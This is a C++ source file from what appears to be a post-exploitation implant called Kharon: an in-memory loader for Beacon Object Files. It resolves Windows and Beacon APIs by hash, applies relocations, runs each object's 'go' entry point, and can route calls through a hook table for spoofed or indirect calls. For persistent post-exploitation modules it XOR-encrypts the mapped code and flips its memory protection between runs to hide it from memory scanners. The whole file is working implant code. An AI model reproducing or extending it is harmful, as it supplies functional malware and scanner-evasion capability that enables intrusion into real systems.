#include <Kharon.h>

auto Coff::GetCmdID(
    PVOID Address
) -> ULONG {
    return Self->Jbs->CurrentSubId;
}

auto Coff::GetTask(
    PVOID Address
) -> CHAR* {
    return Self->Jbs->CurrentUUID;
}

auto Coff::Add(
    PVOID MmBegin,
    PVOID MmEnd,
    PVOID Entry
) -> BOF_OBJ* {
    BOF_OBJ* NewObj = (BOF_OBJ*)KhAlloc( sizeof( BOF_OBJ ) );

    if (
        ! MmBegin ||
        ! MmEnd  
    ) {
        return nullptr;
    }

    NewObj->Entry   = Entry;
    NewObj->MmBegin = MmBegin;
    NewObj->MmEnd   = MmEnd;

    if ( !this->Node ) {
        this->Node = NewObj;
    } else {
        BOF_OBJ* Current = Node;

        while ( Current->Next ) {
            Current = Current->Next;
        }

        Current->Next = NewObj;
    }

    return NewObj;
}

auto Coff::Rm(
    BOF_OBJ* Obj
) -> BOOL {
    if ( ! Obj || !this->Node ) {
        return FALSE; 
    }

    if ( this->Node == Obj ) {
        BOF_OBJ* NextNode = this->Node->Next;
        KhFree( this->Node );
        this->Node = NextNode;
        return TRUE;
    }

    BOF_OBJ* Previous = this->Node;
    while ( Previous->Next && Previous->Next != Obj) {
        Previous = Previous->Next;
    }

    if ( Previous->Next == Obj ) {
        BOF_OBJ* NextNode = Obj->Next;
        KhFree(Obj);      
        Previous->Next = NextNode;
        return TRUE;
    }

    return FALSE;
}

auto Coff::RslRel(
    _In_ PVOID  Base,
    _In_ PVOID  Rel,
    _In_ UINT16 Type
) -> VOID {
    PVOID FlRel = (PVOID)((ULONG_PTR)Base + DEF32( Rel ));

    switch (Type) {
        case IMAGE_REL_AMD64_REL32:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32)); break;
        case IMAGE_REL_AMD64_REL32_1:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 1); break;
        case IMAGE_REL_AMD64_REL32_2:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 2); break;
        case IMAGE_REL_AMD64_REL32_3:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 3); break;
        case IMAGE_REL_AMD64_REL32_4:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 4); break;
        case IMAGE_REL_AMD64_REL32_5:
            DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 5); break;
        case IMAGE_REL_AMD64_ADDR64:
            DEF64( Rel ) = (UINT64)(ULONG_PTR)FlRel; break;
    }
}

auto Coff::RslApi(
    _In_ PCHAR SymName
) -> PVOID {
    PVOID ApiAddress = nullptr;

    KhDbg("Starting resolution for symbol %s", SymName);
    SymName += 6;
    
    //
    // check if is Beacon api and resolve this function
    //
    if ( Str::StartsWith( (BYTE*)SymName, (BYTE*)"Beacon" )  || Str::StartsWith( (BYTE*)SymName, (BYTE*)"Ax" ) ) {
        for ( int i = 0; i < sizeof( ApiTable ) / sizeof( ApiTable[0] ); i++ ) {
            KhDbg("Checking ApiTable[%d] (Hash: 0x%X vs Target: 0x%X)", i, ApiTable[i].Hash, Hsh::Str( SymName ));
            if ( Hsh::Str( SymName ) == ApiTable[i].Hash ) {
                ApiAddress = ApiTable[i].Ptr;
                KhDbg("Found match at index %d (Address: 0x%p)", i, ApiAddress);
                break;
            }
        }
        
    } 

    KhDbg("symbol not in ApiTable, attempting dynamic resolution");

    //
    // check GetProcAddress, GetModuleHandle or LoadLibrary
    //
    if ( Hsh::Str( SymName ) == Hsh::Str( "GetProcAddress"         ) ) return (PVOID)Self->Krnl32.GetProcAddress;
    if ( Hsh::Str( SymName ) == Hsh::Str( "FreeLibrary"            ) ) return (PVOID)Self->Krnl32.FreeLibrary;
    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryW"           ) ) return (PVOID)Self->Cf->LoadLibraryW;
    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryA"           ) ) return (PVOID)Self->Cf->LoadLibraryA;
    if ( Hsh::Str( SymName ) == Hsh::Str( "GetModuleHandleA"       ) ) return (PVOID)Self->Krnl32.GetModuleHandleA;
    if ( Hsh::Str( SymName ) == Hsh::Str( "GetModuleHandleW"       ) ) return (PVOID)Self->Krnl32.GetModuleHandleW;
    if ( Hsh::Str( SymName ) == Hsh::Str( "LdrGetProcedureAddress" ) ) return (PVOID)Self->Ntdll.LdrGetProcedureAddress;

    //
    // if not beacon api, resolve the windows api
    //
    if ( ! ApiAddress ) {
        CHAR RawBuff[MAX_PATH];

        PCHAR LibName = nullptr;
        PCHAR FncName = nullptr;
        BYTE  OffSet  = 0;

        PVOID LibPtr = nullptr;
        PVOID FncPtr = nullptr;

        Mem::Zero( (UPTR)RawBuff, sizeof( RawBuff ) );
        Mem::Copy( RawBuff, SymName, Str::LengthA( SymName ) );
        KhDbg("Raw symbol name: %s %d", RawBuff, sizeof(RawBuff) );

        for ( INT i = 0; i < sizeof( RawBuff ); i++ ) {
            if ( ( RawBuff[i] == (CHAR)'$' ) ) {
                OffSet = i; RawBuff[i] = 0;
                KhDbg("found delimiter at offset %d", OffSet);
                break;
            }
        }

        LibName = RawBuff;
        FncName = &RawBuff[OffSet+1];

        //
        // if hook bof enabled apply the spoof/indirect
        //        
        if ( Self->Config.BofProxy ) {
            for ( INT i = 0; i < 15; i++ ) {
                if ( Hsh::Str( FncName ) == this->HookTable[i].Hash ) {
                    return (PVOID)this->HookTable[i].Ptr;
                }
            }
        }

        INT totalLength = Str::LengthA(LibName) + Str::LengthA(".dll") + 1;

        CHAR LibNameOrg[totalLength];

        Mem::Copy(LibNameOrg, LibName, Str::LengthA(LibName));
        Mem::Copy(LibNameOrg + Str::LengthA(LibName), (PCHAR)".dll", Str::LengthA(".dll"));

        LibNameOrg[totalLength - 1] = '\0';

        KhDbg("lib name: %s fnc name: %s", LibNameOrg, FncName);

        LibPtr = (PVOID)LdrLoad::Module( Hsh::Str<CHAR>( LibNameOrg ) );
        KhDbg("lib found at %p", LibPtr);
        if ( !LibPtr ) {
            KhDbg("loading library %s dynamically", LibNameOrg);
            LibPtr = (PVOID)Self->Lib->Load( (PCHAR)LibNameOrg );
            KhDbg("lib found at %p", LibPtr);
        }

        if ( !LibPtr ) return nullptr;

        KhDbg("resolving function %s in library 0x%p", FncName, LibPtr);
        FncPtr = (PVOID)Self->Krnl32.GetProcAddress( (HMODULE)LibPtr, FncName ); //LdrLoad::Api<PVOID>( (UPTR)LibPtr, Hsh::Str<CHAR>( FncName ) );
        
        if ( FncPtr ) {
            ApiAddress = FncPtr;
            KhDbg("resolved address: 0x%p", ApiAddress);
        }
    }

    KhDbg("returning address: 0x%p", ApiAddress);
    return ApiAddress;
}

//
// Original Loader function now uses Map + Execute + Unmap
//
auto Coff::Map(
    _In_  BYTE*        Buffer,
    _In_  ULONG        Size,
    _Out_ COFF_MAPPED* Mapped
) -> BOOL {
    PVOID  MmBase   = nullptr;
    ULONG  MmSize   = 0;
    PVOID  LastSec  = nullptr;
    PVOID  TmpBase  = nullptr;

    ULONG SecNbrs = 0;
    ULONG SymNbrs = 0;

    UINT8 Iterator = 0;

    PIMAGE_FILE_HEADER    Header  = { 0 };
    IMAGE_SECTION_HEADER* SecHdr  = { 0 };
    PIMAGE_SYMBOL         Symbols = { 0 };
    PIMAGE_RELOCATION     Relocs  = { 0 };

    KhDbg("starting COFF mapping process");

    if ( !Mapped ) {
        KhDbg("invalid output parameter");
        return FALSE;
    }

    Mem::Zero( (UPTR)Mapped, sizeof(COFF_MAPPED) );

    if ( !Buffer || Size < sizeof(IMAGE_FILE_HEADER) ) {
        KhDbg("invalid COFF buffer or size");
        return FALSE;
    }

    Header  = (PIMAGE_FILE_HEADER)Buffer;
    SecHdr  = (IMAGE_SECTION_HEADER*)(Buffer + sizeof(IMAGE_FILE_HEADER));
    SecNbrs = Header->NumberOfSections;
    SymNbrs = Header->NumberOfSymbols;

    if ( SymNbrs == 0 || SecNbrs == 0 ) {
        KhDbg("invalid section or symbol count");
        return FALSE;
    }

    if ( 
        Header->PointerToSymbolTable >= Size || 
        Header->PointerToSymbolTable + ( SymNbrs * sizeof(IMAGE_SYMBOL) ) > Size
    ) {
        KhDbg("invalid symbol table offset");
        return FALSE;
    }

    Symbols = (PIMAGE_SYMBOL)( Buffer + Header->PointerToSymbolTable );
    KhDbg("found %d sections and %d symbols", SecNbrs, SymNbrs);

    COFF_DATA CoffData = { 0 };

    CoffData.Sec = (SECTION_DATA*)KhAlloc( SecNbrs * sizeof(SECTION_DATA) );
    CoffData.Sym = (SYMBOL_DATA*)KhAlloc( SymNbrs * sizeof(SYMBOL_DATA) );
    
    if ( !CoffData.Sec || !CoffData.Sym ) {
        KhDbg("failed to allocate memory for sections/symbols");
        if ( CoffData.Sec ) KhFree( CoffData.Sec );
        if ( CoffData.Sym ) KhFree( CoffData.Sym );
        return FALSE;
    }

    for ( INT i = 0; i < SymNbrs; i++ ) {
        PCHAR SymName     = nullptr;
        BYTE StorageClass = Symbols[i].StorageClass;

        if ( Symbols[i].N.Name.Short ) {
            SymName = (PCHAR)&Symbols[i].N.ShortName;
        } else {
            ULONG NameOffset = Symbols[i].N.Name.Long;
            
            if ( Header->PointerToSymbolTable + (SymNbrs * sizeof(IMAGE_SYMBOL)) + NameOffset >= Size ) {
                KhDbg("symbol name out of bounds (index %d)", i);
                continue;  
            }

            SymName = (PCHAR)(Buffer + Header->PointerToSymbolTable + (SymNbrs * sizeof(IMAGE_SYMBOL)) + NameOffset);
        }

        if ( !SymName ) {
            KhDbg("invalid symbol name (index %d)", i);
            continue;
        }

        CoffData.Sym[i].Name          = SymName;
        CoffData.Sym[i].Hash          = Hsh::Str<CHAR>(SymName);
        CoffData.Sym[i].SectionNumber = Symbols[i].SectionNumber;

        StorageClass = Symbols[i].StorageClass;

        if ( Str::StartsWith( (BYTE*)SymName, (BYTE*)"__imp_") ) {
            MmSize = PAGE_ALIGN(MmSize + sizeof(PVOID));
            CoffData.Sym[i].Type = COFF_IMP;
            CoffData.Sym[i].Ptr  = this->RslApi(SymName);
        } 
        else if ( ISFCN(Symbols[i].Type) ) {
            CoffData.Sym[i].Type = COFF_FNC;
            CoffData.Sym[i].Rva  = Symbols[i].Value;
        } 
        else if (
            !ISFCN(Symbols[i].Type) &&
            StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
            !Str::StartsWith( (BYTE*)SymName, (BYTE*)"__imp_" ) 
        ) {
            CoffData.Sym[i].Type = COFF_VAR;
            CoffData.Sym[i].Rva  = Symbols[i].Value;
        }
    }

    for ( INT i = 0; i < SecNbrs; i++ ) {
        MmSize = PAGE_ALIGN( MmSize + SecHdr[i].SizeOfRawData );
    }

    KhDbg("total memory required: %d bytes (aligned)", MmSize);
    MmBase = Self->Mm->Alloc( nullptr, MmSize, MEM_COMMIT, PAGE_READWRITE );
    if ( !MmBase ) {
        KhDbg("failed to allocate memory for COFF");
        KhFree( CoffData.Sec );
        KhFree( CoffData.Sym );
        return FALSE;
    }

    KhDbg("allocated memory at 0x%p", MmBase);

    TmpBase = MmBase;
    for ( INT i = 0; i < SecNbrs; i++ ) {
        CoffData.Sec[i].Base = TmpBase;
        CoffData.Sec[i].Size = SecHdr[i].SizeOfRawData;

        Mem::Copy(
            (BYTE*)TmpBase + SecHdr[i].VirtualAddress,
            Buffer + SecHdr[i].PointerToRawData,
            SecHdr[i].SizeOfRawData
        );

        TmpBase = (PVOID)PAGE_ALIGN((ULONG_PTR)TmpBase + SecHdr[i].SizeOfRawData);
    }

    LastSec = TmpBase;

    //
    // apply relocations
    //
    {
        PVOID* ImportTable = (PVOID*)LastSec;
        for ( INT i = 0; i < SecNbrs; i++ ) {
            Relocs = (PIMAGE_RELOCATION)( Buffer + SecHdr[i].PointerToRelocations );

            for ( INT x = 0; x < SecHdr[i].NumberOfRelocations; x++ ) {
                PIMAGE_SYMBOL SymReloc = &Symbols[Relocs[x].SymbolTableIndex];
                PVOID RelocAddr = (PVOID)((ULONG_PTR)CoffData.Sec[i].Base + Relocs[x].VirtualAddress);

                if ( Relocs[x].Type == IMAGE_REL_AMD64_REL32 && CoffData.Sym[Relocs[x].SymbolTableIndex].Type == COFF_IMP ) {
                    ImportTable[Iterator] = CoffData.Sym[Relocs[x].SymbolTableIndex].Ptr;
                    DEF32( RelocAddr ) = (UINT32)((ULONG_PTR)&ImportTable[Iterator] - (ULONG_PTR)RelocAddr - 4);
                    Iterator++;
                } else {
                    PVOID TargetBase = CoffData.Sec[SymReloc->SectionNumber-1].Base;
                    PVOID TargetAddr = (PVOID)((ULONG_PTR)TargetBase + SymReloc->Value);
                    this->RslRel(TargetAddr, RelocAddr, Relocs[x].Type);
                }
            }
        }
    }

    //
    // count executable sections and store their info
    //
    ULONG ExecCount = 0;
    for ( INT j = 0; j < SecNbrs; j++ ) {
        if ( SecHdr[j].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
            ExecCount++;
        }
    }

    if ( ExecCount > 0 ) {
        Mapped->ExecSections = (PVOID*)KhAlloc( ExecCount * sizeof(PVOID) );
        Mapped->ExecSizes    = (ULONG*)KhAlloc( ExecCount * sizeof(ULONG) );
        
        if ( Mapped->ExecSections && Mapped->ExecSizes ) {
            ULONG idx = 0;
            for ( INT j = 0; j < SecNbrs; j++ ) {
                if ( SecHdr[j].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
                    Mapped->ExecSections[idx] = CoffData.Sec[j].Base;
                    Mapped->ExecSizes[idx]    = CoffData.Sec[j].Size;
                    idx++;
                }
            }
            Mapped->ExecCount = ExecCount;
        }
    }

    //
    // set proper memory protections
    //
    for ( INT j = 0; j < SecNbrs; j++ ) {
        ULONG OldProt = 0;
        
        if ( SecHdr[j].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
            Self->Mm->Protect( CoffData.Sec[j].Base, CoffData.Sec[j].Size, PAGE_EXECUTE_READ, &OldProt );
        }
    }

    //
    // find the 'go' symbol (entrypoint)
    //
    PVOID EntryPoint = nullptr;
    for ( INT i = 0; i < SymNbrs; i++ ) {
        if (
            CoffData.Sym[i].Type == COFF_FNC &&
            CoffData.Sym[i].Hash == Hsh::Str<CHAR>( "go" )
        ) {
            for ( INT j = 0; j < SecNbrs; j++ ) {
                if ( Symbols[i].SectionNumber == j + 1 ) {
                    EntryPoint = PTR( U_PTR( CoffData.Sec[j].Base ) + Symbols[i].Value );
                    KhDbg("found 'go' function at 0x%p", EntryPoint);
                    break;
                }
            }
            break;
        }
    }

    if ( !EntryPoint ) {
        KhDbg("'go' entrypoint not found - COFF may use custom entry points");
    }

    Mapped->MmBase       = MmBase;
    Mapped->MmSize       = MmSize;
    Mapped->EntryPoint   = EntryPoint;
    Mapped->CoffData     = CoffData;
    Mapped->SecNbrs      = SecNbrs;
    Mapped->SymNbrs      = SymNbrs;
    Mapped->IsObfuscated = FALSE;

    KhDbg("COFF mapped successfully");

    return TRUE;
}

//
// Obfuscates a mapped COFF (RX -> RW + XOR)
//
auto Coff::Obfuscate(
    _In_ COFF_MAPPED* Mapped
) -> BOOL {
    if ( !Mapped || !Mapped->MmBase || Mapped->IsObfuscated ) {
        KhDbg("invalid mapped COFF or already obfuscated");
        return FALSE;
    }

    KhDbg("obfuscating COFF at 0x%p", Mapped->MmBase);

    //
    // change executable sections to RW
    //
    for ( ULONG i = 0; i < Mapped->ExecCount; i++ ) {
        ULONG OldProt = 0;
        Self->Mm->Protect( 
            Mapped->ExecSections[i], Mapped->ExecSizes[i], PAGE_READWRITE, &OldProt 
        );

        KhDbg("section %d changed to RW: 0x%p (%d bytes)", i, Mapped->ExecSections[i], Mapped->ExecSizes[i]);
    }

    //
    // XOR encrypt entire region
    //
    Self->Crp->Xor( (BYTE*)Mapped->MmBase, Mapped->MmSize );

    Mapped->IsObfuscated = TRUE;
    KhDbg("COFF obfuscated successfully");

    return TRUE;
}

//
// Deobfuscates a mapped COFF
//
auto Coff::Deobfuscate(
    _In_ COFF_MAPPED* Mapped
) -> BOOL {
    if ( !Mapped || !Mapped->MmBase || !Mapped->IsObfuscated ) {
        KhDbg("invalid mapped COFF or not obfuscated");
        return FALSE;
    }

    KhDbg("deobfuscating COFF at 0x%p", Mapped->MmBase);

    //
    // XOR decrypt entire region
    //
    Self->Crp->Xor( (BYTE*)Mapped->MmBase, Mapped->MmSize );

    //
    // change executable sections back to RX
    //
    for ( ULONG i = 0; i < Mapped->ExecCount; i++ ) {
        ULONG OldProt = 0;
        
        Self->Mm->Protect( 
            Mapped->ExecSections[i], Mapped->ExecSizes[i], PAGE_EXECUTE_READ, &OldProt 
        );

        KhDbg("section %d changed to RX: 0x%p (%d bytes)", i, Mapped->ExecSections[i], Mapped->ExecSizes[i]);
    }

    Mapped->IsObfuscated = FALSE;
    KhDbg("COFF deobfuscated successfully");

    return TRUE;
}

//
// Executes a previously mapped COFF 
//
auto Coff::Execute(
    _In_ COFF_MAPPED* Mapped,
    _In_ BYTE*        Args,
    _In_ ULONG        Argc
) -> BOOL {
    if ( !Mapped || !Mapped->MmBase || !Mapped->EntryPoint ) {
        KhDbg("invalid mapped COFF");
        return FALSE;
    }

    //
    // deobfuscate if needed
    //
    BOOL WasObfuscated = Mapped->IsObfuscated;
    if ( WasObfuscated ) {
        if ( !this->Deobfuscate( Mapped ) ) {
            KhDbg("failed to deobfuscate COFF");
            return FALSE;
        }
    }

    KhDbg("executing mapped COFF at 0x%p", Mapped->EntryPoint);

    BOF_OBJ* Obj = (BOF_OBJ*)this->Add( 
        Mapped->MmBase, PTR( U_PTR( Mapped->MmBase ) + Mapped->MmSize ), Mapped->EntryPoint 
    );

    if ( Obj ) KhDbg("added the object to the list");

    VOID ( *Go )( BYTE*, ULONG ) = ( decltype( Go ) )( Mapped->EntryPoint );
    KhDbg("calling 'go' function");
    Go( Args, Argc );

    //
    // for persistent COFFs (PostEx), re-obfuscate after execution
    //
    if ( (Action::Task)Self->Jbs->CurrentCmdId == Action::Task::PostEx ) {
        this->Obfuscate( Mapped );
    } else {
        if ( this->Rm( Obj ) ) KhDbg("removed the object from the list");
    }

    return TRUE;
}

//
// Frees a mapped COFF
//
auto Coff::Unmap(
    _In_ COFF_MAPPED* Mapped
) -> BOOL {
    if ( !Mapped ) {
        return FALSE;
    }

    //
    // deobfuscate before freeing (optional, but cleaner)
    //
    if ( Mapped->IsObfuscated ) {
        Self->Crp->Xor( (BYTE*)Mapped->MmBase, Mapped->MmSize );
    }

    if ( Mapped->MmBase ) {
        Self->Mm->Free( Mapped->MmBase, Mapped->MmSize, MEM_RELEASE );
    }

    if ( Mapped->CoffData.Sec )  KhFree( Mapped->CoffData.Sec );
    if ( Mapped->CoffData.Sym )  KhFree( Mapped->CoffData.Sym );
    if ( Mapped->ExecSections )  KhFree( Mapped->ExecSections );
    if ( Mapped->ExecSizes )     KhFree( Mapped->ExecSizes );

    Mem::Zero( (UPTR)Mapped, sizeof(COFF_MAPPED) );

    KhDbg("COFF unmapped successfully");

    return TRUE;
}

auto Coff::FindSymbol(
    _In_ COFF_MAPPED* Mapped,
    _In_ PCHAR        SymName
) -> PVOID {
    
    if ( !Mapped || !SymName ) return nullptr;

    ULONG TargetHash = Hsh::Str<CHAR>( SymName );

    SECTION_DATA* Sec = Mapped->CoffData.Sec;
    SYMBOL_DATA*  Sym = Mapped->CoffData.Sym;
    
    for ( ULONG i = 0; i < Mapped->SymNbrs; i++ ) {
        if ( Sym[i].Type == COFF_FNC && Sym[i].Hash == TargetHash ) {
            
            INT16 SecIdx = Sym[i].SectionNumber - 1; 
            
            if ( SecIdx >= 0 && (ULONG)SecIdx < Mapped->SecNbrs ) {
                PVOID Address = PTR( U_PTR( Sec[SecIdx].Base ) + Sym[i].Rva );
                KhDbg("FindSymbol: found '%s' at 0x%p (section %d, rva 0x%x)", 
                      SymName, Address, SecIdx, Sym[i].Rva);
                return Address;
            }
        }
    }
    
    KhDbg("FindSymbol: '%s' not found", SymName);
    return nullptr;
}

//
// Original Loader function
//
auto Coff::Loader(
    _In_ BYTE* Buffer,
    _In_ ULONG Size,
    _In_ BYTE* Args,
    _In_ ULONG Argc
) -> BOOL {
    COFF_MAPPED Mapped = { 0 };

    if ( !this->Map( Buffer, Size, &Mapped ) ) {
        return FALSE;
    }

    BOOL Result = this->Execute( &Mapped, Args, Argc );

    //
    // only unmap if not persistent (PostEx stays mapped + obfuscated)
    //
    if ( (Action::Task)Self->Jbs->CurrentCmdId != Action::Task::PostEx ) {
        this->Unmap( &Mapped );
    }

    return Result;
}